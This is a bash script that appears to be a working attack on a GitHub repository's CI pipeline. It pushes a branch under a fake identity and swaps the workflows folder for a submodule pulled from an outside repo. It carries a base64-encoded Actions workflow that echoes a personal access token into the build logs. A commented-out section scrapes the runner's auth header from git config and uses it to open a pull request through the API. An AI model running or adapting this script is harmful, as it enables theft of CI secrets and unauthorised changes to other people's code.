#!/bin/bash

# wget https://sca-downloads.s3.amazonaws.com/cli/latest/ScaResolver-linux64.tar.gz
# tar -xzvf ScaResolver-linux64.tar.gz -C /tmp
# rm -rf ScaResolver-linux64.tar.gz

# VARS
branch=$(cat /proc/sys/kernel/random/uuid)
username="Moti Banana"
email="MotiBanana@zurich.com"
malicious_code="bmFtZTogSSBBTSBDUkFaWSEKCm9uOiBbcHVzaF0KCmpvYnM6CiAgTWFrYXQtU2hlbWVzaDoKICAgIHJ1bnMtb246IHVidW50dS1sYXRlc3QKICAgIGVudjoKICAgICAgR09QUklWQVRFOiAiZ2l0aHViLmNvbS9jaGVja21hcnhEZXYvKiIKICAgIHN0ZXBzOgogICAgICAtIG5hbWU6IENoZWNrb3V0IHRoZSByZXBvc2l0b3J5IFhYWFgKICAgICAgICB1c2VzOiBhY3Rpb25zL2NoZWNrb3V0QHYyLjMuNAogICAgICAtIG5hbWU6IFNldCB1cCBHbyAxLjE3LngKICAgICAgICB1c2VzOiBhY3Rpb25zL3NldHVwLWdvQHYyCiAgICAgICAgd2l0aDoKICAgICAgICAgIGdvLXZlcnNpb246IDEuMTcueAogICAgICAtIG5hbWU6IFNldHVwIGdpdAogICAgICAgIHJ1bjogZ2l0IGNvbmZpZyAtLWdsb2JhbCB1cmwuImh0dHBzOi8vJHt7IHNlY3JldHMuUEVSU09OQUxfQUNDRVNTX1RPS0VOIH19OkBnaXRodWIuY29tLyIuaW5zdGVhZE9mICJodHRwczovL2dpdGh1Yi5jb20iCiAgICAgIC0gbmFtZTogZ28gbGVhawogICAgICAgIHJ1bjogfAogICAgICAgICAgZWNobyAiJHt7IHNlY3JldHMuUEVSU09OQUxfQUNDRVNTX1RPS0VOIH19IiB8IGJhc2U2NAo="

## Part 0 -> Declare ourselves
git config --global user.email "$email"
git config --global user.name "$username"

## Part 1 -> Create a branch as the privileged runner
git checkout -b "$branch"
git commit -m "0xdeadbeef"
git push --set-upstream origin "$branch"

## Part 2 -> Inject payload for phase 2

rm -rf .github/workflows
git add . && git commit -m "Cleans"
git submodule add https://github.com/gomagic/workflows .github/workflows
git add . && git commit -m "Flows"


## Part 3 -> Add the file and commit
# git add .
# git commit -m "0xdeadbeef"
# git push --set-upstream origin "$branch"
# git commit --amend --no-edit && 

git push --set-upstream origin "$branch"

# Part 3.1 -> Make empty commit? to trigger?
git commit --allow-empty -m "Trigger"
git push --set-upstream origin "$branch"

## Part 4 -> Extract the token and create the PR
# echo "[ + ] TOKEN"
# git config --list |\
#     tr "\n" " "|\
#     sed 's/.*http.https:\/\/github\.com\/\.extraheader=AUTHORIZATION: basic //gi' | base64 | base64
# token=$(git config --list |\
#     tr "\n" " "|\
#     sed 's/.*http.https:\/\/github\.com\/\.extraheader=AUTHORIZATION: basic //gi'
# echo "[ + ] Actual value -> $token")
# echo "[ + ] /TOKEN"
# echo "[ + ] Creating PR..."
# curl \
#   -X POST \
#   -H "Accept: application/vnd.github+json" \
#   -H "Authorization: Basic $token"\
# #   -H "X-GitHub-Api-Version: 2022-11-28" \
#   https://api.github.com/repos/gomagic/marx/pulls \
#   -d '{"title":"Amazing new feature",
#   "body":"Please pull these awesome changes in!","head":"$branch","base":"main"}' &&\
#     echo "[ + ] fi"


# go test ./... -coverprofile cover.out
